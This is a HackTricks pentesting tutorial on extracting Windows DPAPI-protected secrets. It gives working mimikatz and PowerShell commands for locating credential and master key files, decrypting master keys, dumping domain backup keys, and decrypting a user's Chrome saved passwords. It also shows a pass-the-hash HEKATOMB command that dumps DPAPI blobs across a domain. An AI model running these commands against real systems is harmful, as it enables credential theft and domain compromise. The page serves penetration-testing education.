# DPAPI - Extracting Passwords

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

While creating this post mimikatz was having problems with every action that interacted with DPAPI therefore **most of the examples and images were taken from**: [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin)

## What is DPAPI

Its primary use in the Windows operating system is to **perform symmetric encryption of asymmetric private keys**, using a user or system secret as a significant contribution of entropy.\
**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.

This makes very easy to developer to **save encrypted data** in the computer **without** needing to **worry** how to **protect** the **encryption** **key**.

### What does DPAPI protect?

DPAPI is utilized to protect the following personal data:

* Passwords and form auto-completion data in Internet Explorer, Google \*Chrome
* E-mail account passwords in Outlook, Windows Mail, Windows Mail, etc.
* Internal FTP manager account passwords
* Shared folders and resources access passwords
* Wireless network account keys and passwords
* Encryption key in Windows CardSpace and Windows Vault
* Remote desktop connection passwords, .NET Passport
* Private keys for Encrypting File System (EFS), encrypting mail S-MIME, other user's certificates, SSL/TLS in Internet Information Services
* EAP/TLS and 802.1x (VPN and WiFi authentication)
* Network passwords in Credential Manager
* Personal data in any application programmatically protected with the API function CryptProtectData. For example, in Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk etc.
* ...

{% hint style="info" %}
An example of a successful and clever way to protect data using DPAPI is the implementation of the auto-completion password encryption algorithm in Internet Explorer. To encrypt the login and password for a certain web page, it calls the CryptProtectData function, where in the optional entropy parameter it specifies the address of the web page. Thus, unless one knows the original URL where the password was entered, nobody, not even Internet Explorer itself, can decrypt that data back.
{% endhint %}

## List Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Credential Files

The **credentials files protected by the master password** could be located in:

```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Get credentials info using mimikatz `dpapi::cred`, in the response you can find interesting info such as the encrypted data and he guidMasterKey.

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:

```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```

## Master Keys

The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of Master Keys of a user will looks like:

![](<../../.gitbook/assets/image (324).png>)

Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it.

### Extract master key & decrypt

In the previous section we found the guidMasterKey which looked like `3e90dd9e-f901-40a1-b691-84d7f647b8fe`, this file will be inside:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID>
```

For where you can extract the master key with mimikatz:

```bash
# If you know the users password
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected

# If you don't have the users password and inside an AD
dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /rpc
```

The master key of the file will appear in the output.

Finally, you can use that **masterkey** to **decrypt** the **credential file**:

```
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
```

### Extract all local Master Keys with Administrator

If you are administrator you can obtain the dpapi master keys using:

```
sekurlsa::dpapi
```

![](<../../.gitbook/assets/image (326).png>)

### Extract all backup Master Keys with Domain Admin

A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:

```
lsadump::backupkeys /system:dc01.offense.local /export
```

![](<../../.gitbook/assets/image (327).png>)

Using the retrieved backup key, let's decrypt user's `spotless` master key:

```bash
dpapi::masterkey /in:"C:\Users\spotless.OFFENSE\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

We can now decrypt user's `spotless` chrome secrets using their decrypted master key:

```
dpapi::chrome /in:"c:\users\spotless.offense\appdata\local\Google\Chrome\User Data\Default\Login Data" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6
```

![](<../../.gitbook/assets/image (329).png>)

## Encrypting and Decrypting content

You can find an example of how to encrypt and decrypt data with DAPI using mimikatz and C++ in [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)\
You can find an example on how to encrypt and decrypt data with DPAPI using C# in [https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) is a C# port of some DPAPI functionality from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is a tool that automates the extraction of all users and computers from the LDAP directory and the extraction of domain controller backup key through RPC. The script will then resolve all computers ip address and perform a smbclient on all computers to retrieve all DPAPI blobs of all users and decrypt everything with domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

With extracted from LDAP computers list you can find every sub network even if you didn't know them !

"Because Domain Admin rights are not enough. Hack them all."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) can dump secrets protected by DPAPI automatically.

## References

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
